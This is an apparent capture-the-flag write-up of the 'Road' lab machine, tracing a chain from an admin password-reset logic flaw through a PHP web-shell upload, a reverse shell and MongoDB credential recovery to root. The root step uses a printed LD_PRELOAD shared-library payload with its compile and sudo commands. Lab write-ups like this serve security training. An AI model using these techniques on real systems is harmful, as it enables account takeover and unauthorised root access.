# Road CTF Challenge Write-Up

## Overview

I started this challenge by scanning the target, identifying a web application with an authentication and password-reset flaw, and then abusing that flaw to take over the admin account. Once I had administrative access, I uploaded a PHP web shell, gained a reverse shell as `www-data`, pivoted to a local MongoDB credential, and recovered the `webdeveloper` account. After that, I found a SUDO policy that allowed `LD_PRELOAD` abuse and escalated to root.

This was the route I followed:

- I scanned the target and confirmed SSH and HTTP were open.
- I discovered a small but important web application under `/v2/admin`.
- I registered an account and explored the site.
- I found a password-reset endpoint that allowed me to reset the admin password by abusing an email-based logic flaw.
- I logged in as the admin account and uploaded a PHP shell.
- I obtained a shell as `www-data`.
- I enumerated the system and found a MongoDB service.
- I recovered the `webdeveloper` password from the `backup` database.
- I logged in over SSH as `webdeveloper`.
- I checked `sudo -l` and identified a vulnerable `LD_PRELOAD` escalation path.
- I escalated to root and read the final proof flag.

---

## 1. Initial Reconnaissance

### Port scan

I ran:

```bash
nmap -sV 10.112.160.219
```

This was the output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-30 09:59 -0400
Nmap scan report for 10.112.160.219
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The host was a Linux machine exposing SSH and a web service. I focused on the web application first.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

I ran directory enumeration to find interesting pages:

```bash
feroxbuster -u http://10.112.160.219/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Most of the output was irrelevant, but one endpoint stood out:

```text
http://10.112.160.219/v2/admin => http://10.112.160.219/v2/admin/
```

I visited the admin area and created a new account so I could explore the app as a regular user.

### Application pages

The dashboard offered several sections:

- Dashboards
- Manage Order
- Upload Manifest
- All Order
- Manifest Status
- Users
- ResetUser
- Print Options
- Reports
- NDR
- ODA Orders
- Ticket Management
- Billing
- Pincode Serviceability
- API Documentation
- Warehouses
- SMS Counter

Most links were not useful for direct code execution or file uploads, and the relevant upload feature was not obvious. The only enabled function that looked interesting was `ResetUser`.

I also checked my profile settings and noticed this message:

```text
Select Profile Image
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.
```

This told me the application expected an email-based identity model, and it likely had logic tied to the admin email address.

![Image Placeholder: Profile image restriction message](./assets/profile-image-message.png)

---

## 3. Password Reset Vulnerability

### Initial observation

I looked at the password reset flow and used Burp Suite to inspect the request.

```http
POST /v2/lostpassword.php HTTP/1.1

------geckoformboundary7054b372d147644b673ee6287520a00b
Content-Disposition: form-data; name="uname"

alex@gmail.com

------geckoformboundary7054b372d147644b673ee6287520a00b
Content-Disposition: form-data; name="npass"

alex2

------geckoformboundary7054b372d147644b673ee6287520a00b
Content-Disposition: form-data; name="cpass"

alex2
```

This was key: the request accepted an `uname` value, which appeared to be the user’s email, and the app then reset that account’s password.

I realized I could try changing the email to the admin address:

```http
Content-Disposition: form-data; name="uname"

admin@sky.thm
```

I submitted the reset and got:

```text
Password changed.
Taking you back...
```

This confirmed the flaw: the application trusted an attacker-controlled email value instead of the actual logged-in account identity.

### Exploitation

I logged out and then signed in with:

```text
Username: admin@sky.thm
Password: alex2
```

The login succeeded.

> Important: This was the critical logic flaw. I was not resetting my own account; I was resetting the admin account by manipulating the `uname` field in the request.

---

## 4. Uploading the Web Shell

After logging in as admin, I went to the profile image upload area and uploaded a PHP file named `shell2.php`.

I accessed it here:

```text
http://10.112.160.219/v2/profileimages/shell2.php
```

I then started my listener:

```bash
nc -lvnp 9991
```

The web shell connected back to me:

```text
listening on [any] 9991 ...
connect to [192.168.131.124] from (UNKNOWN) [10.112.160.219] 50778
Linux ip-10-112-160-219 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
14:38:25 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I had a shell as `www-data`.

### Trial and error: failed upload bypass attempts

I initially tried multiple file names and extensions, thinking I needed a bypass to upload a PHP shell. I attempted:

```bash
shell.php.png
shell.php.jpg
shell.php#.jpg
shell.php%00.jpg
```

Those attempts did not work. The important realization was that the upload function accepted a simple PHP file directly. The successful payload was just:

```bash
shell.php
```

This was a good reminder that the simplest path is often the correct one.

![Image Placeholder: Uploaded PHP web shell](./assets/uploaded-shell.png)

---

## 5. User Enumeration and the `webdeveloper` Account

I enumerated the home folders to look for useful user accounts:

```bash
cd /home
$ ls
ubuntu
webdeveloper
$ cd webdeveloper
$ ls
user.txt
cat user.txt
```

This gave me the user flag and confirmed a second local user existed on the machine.

I then performed the usual privilege-escalation checks:

```bash
sudo -l
find / -perm -4000 -type f -ls 2>/dev/null
ps aux
```

Nothing obvious appeared at first, so I continued investigating the running processes and system services.

### MongoDB discovery

I saw a running MongoDB service in the process list:

```text
mongod
```

I used that as the next lead. If the service was running and accessible locally, it might contain useful application data or credentials.

---

## 6. Recovering Credentials from MongoDB

I connected to MongoDB:

```bash
mongo
```

Then I listed the databases:

```bash
show dbs
```

```text
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```

I checked the `backup` database, since it looked like the most likely place for application data:

```bash
use backup
show users
show collections
```

I then queried the users collection:

```bash
db.user.find().pretty()
```

This returned:

```json
{
        "_id" : ObjectId("60ae2690203d21857b184a78"),
        "Name" : "webdeveloper",
        "Pass" : "BahamasChapp123!@#"
}
```

I had the password for the `webdeveloper` user. This was the key pivot from web compromise to system access.

I used it to SSH into the machine:

```bash
ssh webdeveloper@10.112.160.219
```

---

## 7. SSH as `webdeveloper`

Once I was in as `webdeveloper`, I checked the allowed sudo commands:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for webdeveloper on ip-10-112-160-219:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
    User webdeveloper may run the following commands on ip-10-112-160-219:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

This was the privilege escalation path.

The crucial detail was:

```text
env_keep+=LD_PRELOAD
```

That allowed me to set the `LD_PRELOAD` environment variable when running a SUDO command and load a malicious shared library.

---

## 8. Exploiting `LD_PRELOAD` with `sudo`

I created a malicious shared library in `/tmp`:

```bash
cd /tmp
nano shell.c
```

I used the following payload:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>  

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then I compiled it:

```bash
gcc -fPIC -shared -o /tmp/pe.so shell.c -nostartfiles
```

I executed the allowed binary with `LD_PRELOAD`:

```bash
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
```

The result was a root shell:

```text
root@ip-10-112-160-219:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

I confirmed the escalation successfully.

---

## 9. Root Flag Retrieval

I moved to the root directory and read the final proof file:

```bash
cd /root
ls
cat root.txt
```

This completed the challenge.

---

## 10. Full Exploit Chain

Here is the complete sequence I used:

1. I ran `nmap` and found SSH and HTTP exposed.
2. I enumerated the web application and found the `/v2/admin` area.
3. I registered a user and inspected the app.
4. I identified a password-reset flaw tied to the `uname` parameter.
5. I changed the target email to `admin@sky.thm` and reset the admin password.
6. I logged in as the admin account.
7. I uploaded a PHP web shell and obtained a `www-data` reverse shell.
8. I enumerated the system and discovered MongoDB.
9. I connected to MongoDB and extracted the `webdeveloper` password.
10. I SSHed into the machine as `webdeveloper`.
11. I checked `sudo -l` and found the vulnerable command.
12. I abused `LD_PRELOAD` via `sudo` to get a root shell.
13. I read `/root/root.txt` and completed the challenge.

---

## 11. Key Takeaways

- Password reset logic is a common source of privilege escalation when the server trusts an attacker-controlled email field.
- A vulnerable profile upload feature can be abused to deliver a PHP web shell when file validation is weak.
- MongoDB can contain plaintext application credentials if left improperly exposed.
- `sudo -l` is critical during privilege escalation and should always be checked.
- `LD_PRELOAD` abuse is a classic path when `sudo` preserves the environment and the target binary is user-controlled.

> Important: The challenge was not solved by a complex binary exploit alone. The real breakthrough was abusing the reset-password logic to take over admin, then pivoting from the web shell to MongoDB and finally to root through `LD_PRELOAD`.

---

## 12. Relevant Commands

```bash
nmap -sV 10.112.160.219
feroxbuster -u http://10.112.160.219/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
nc -lvnp 9991
cd /home
ls
cd webdeveloper
ls
cat user.txt
ps aux
mongo
show dbs
use backup
show collections
db.user.find().pretty()
ssh webdeveloper@10.112.160.219
sudo -l
cd /tmp
nano shell.c
gcc -fPIC -shared -o /tmp/pe.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
id
cd /root
ls
cat root.txt
```

---

## Final Result

I successfully completed the Road challenge by abusing the password reset logic, taking over the admin account, uploading a PHP web shell, recovering the `webdeveloper` password from MongoDB, and escalating to root via `LD_PRELOAD` abuse. I then read the final root flag from `/root/root.txt`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)
